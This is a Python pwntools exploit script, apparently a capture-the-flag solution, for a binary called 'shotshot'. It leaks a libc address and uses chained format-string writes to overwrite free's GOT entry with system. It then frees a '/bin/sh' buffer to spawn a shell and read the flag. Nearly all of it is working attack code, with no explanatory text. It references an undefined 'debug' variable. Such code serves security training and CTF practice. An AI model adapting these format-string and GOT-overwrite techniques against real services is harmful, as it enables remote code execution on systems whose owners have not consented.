from pwn import *
import sys
if len(sys.argv) < 2:
	p = process("./shotshot")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./shotshot")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("./libc.so.6")
	elf = ELF("./shotshot")

def init(name):
	p.sendafter("Your name :",name)
	p.recvuntil(name)
	return p.recv(6)

def create(size,content):
	p.sendlineafter("5. exit\n","1")
	p.sendlineafter("name:\n",str(size))
	p.sendafter("name:\n",content)
	p.recvuntil("Success!\n")

def show():
	p.sendlineafter("5. exit\n","2")
	return p.recvuntil("1. create weapon\n",drop=True)

def drop():
	p.sendlineafter("5. exit\n","3")
	return p.recvuntil("I can't believe it!\n")

def shot(menu,index,passinfo = False,dead = False,value = 0):
	p.sendlineafter("5. exit\n","4")
	p.sendlineafter("3. C++\n",str(menu))
	if not passinfo:
		p.sendlineafter("Input the id:\n",str(index))
	if dead:
		p.sendlineafter("Give me your luckynum:\n",str(value))

def debugf():
	#gdb.attach(p,"b *0x400AC0\nb *0x400AED\nb *0x400E5D\nb *0x4009E8")
	gdb.attach(p,"b *0x400E7c")

def changevalue(stack_addr,addr,value):
	temp2 = addr
	for i in range(8):
		addr = temp2
		for j in range(8):
			payload1 = ""
			payload1 += "%{num}c%13$hhn".format(num=(stack_addr&0xff)+j)
			create(len(payload1),payload1)
			show()
			num = addr & 0xff
			if num == 0:
				payload2 = "%39$hhn"
			else:
				payload2 = "%{num}c%39$hhn".format(num=num+i)
			create(len(payload2),payload2)
			show()
			addr = addr >> 8
			if i != 0 :
				break
		num = value & 0xff
		if num != 0:
			payload3 = "%6$p".format(num=num)
		else:
			payload3 = "%768$hhn"
		create(len(payload3),payload3)
		show()
		value = value >> 8

def change_value2(addr,value):
	payload1 = "%{num}c%6$n".format(num=addr)
	create(len(payload1),payload1)
	show()
	for i in range(8):
		num = value & 0xff
		if num == 0 :
			payload2 = "%10$hhn"
		else:
			payload2 = "%{num}c%10$hhn".format(num=num)
		create(len(payload2),payload2)
		show()
		value = value >> 8
		payload1 = "%{num}c%6$hhn".format(num=(addr&0xff)+i+1)
		create(len(payload1),payload1)
		show()
	
def change_value3(stack_addr,addr,value):
	num = (stack_addr & 0xffff) + 8
	payload = "%{num}c%13$hn".format(num=num)
	create(len(payload),payload)
	show()
	temp = addr
	for i in range(8):
		addr = temp + i
		for j in range(8):
			num = ((stack_addr+8+j) & 0xff)
			payload = "%{num}c%13$hhn".format(num=num)
			if num == 0:
				payload = "%13$hhn"
			create(len(payload),payload)
			show()
			num = ((addr) & 0xff)
			payload = "%{num}c%39$hhn".format(num=num)
			if num == 0:
				payload = "%39$hhn".format(num=num)
			addr = addr >> 8
			create(len(payload),payload)
			show()
			if i >=1 :
				break
		num = (value & 0xff)
		payload = "%{num}c%40$hhn".format(num=num)
		if num == 0:
			payload = "%40$hhn"	
		create(len(payload),payload)
		show()
		value = value >> 8
		
			

context.log_level = "debug"
#context.terminal = ["tmux","splitw","-v"]
#debugf()
info = init("a"*0x28)
leak_addr = u64(info.ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["setvbuf"] - 324
log.success("libc_base:"+hex(libc.address))
#1 -> 7

payload = "%13$p"
create(len(payload),payload)
info = show()
stack_addr = int(info.split("1.")[0],16)
log.success("stack_addr:"+hex(stack_addr))

free_got = elf.got["free"]
system_addr = libc.symbols["system"]
binsh = "/bin/sh\x00"
log.success("target:"+hex(system_addr))
change_value3(stack_addr,free_got,system_addr)
#change_value2(free_got,system_addr)
log.success("target:"+hex(system_addr))
create(len(binsh),binsh)
drop()
"""
one_gadget = libc.address + 0x45216
create(1,"a")
index = 0#0x7ffd378500f8 - 0x7f37a1c35000
target_addr = 0
for i in range(50):
	shot(1,index)
	shot(4,index,True)
	shot(4,index,True)
	shot(4,index,True,dead=True,value=one_gadget)
"""
if debug:
	p.sendline("cat flag")
else:
	p.sendline("./flag")
print p.recvline()
	 
